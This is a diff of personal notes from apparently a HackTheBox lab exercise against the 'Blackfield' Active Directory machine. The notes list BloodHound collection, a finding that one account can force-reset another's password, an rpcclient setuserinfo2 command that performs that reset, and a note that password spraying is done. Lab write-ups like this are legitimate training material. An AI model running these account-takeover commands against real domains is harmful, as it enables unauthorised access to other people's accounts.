@@ -54,7 +54,7 @@ python3 bloodhound.py --dns-tcp -c all -d BLACKFIELD.local -dc DC01.BLACKFIELD.l
 
 ```
 
-- support forcepassword audit2020
+- support forcepassword audit2020, but it might acommplish much
 - svc_backup is the only member of remote mamagement
 -
 -
@@ -66,8 +66,12 @@ python3 bloodhound.py --dns-tcp -c all -d BLACKFIELD.local -dc DC01.BLACKFIELD.l
 
 #### Todo List
 
-- rescan tcp done
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
+```
+rpcclient -U KnownUsername 10.10.10.192
+> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
+```
 
-
-- password spray
+- rescan tcp - done
+- password spray - done
 - profile seems like a rabbithole of profiles -check potentially
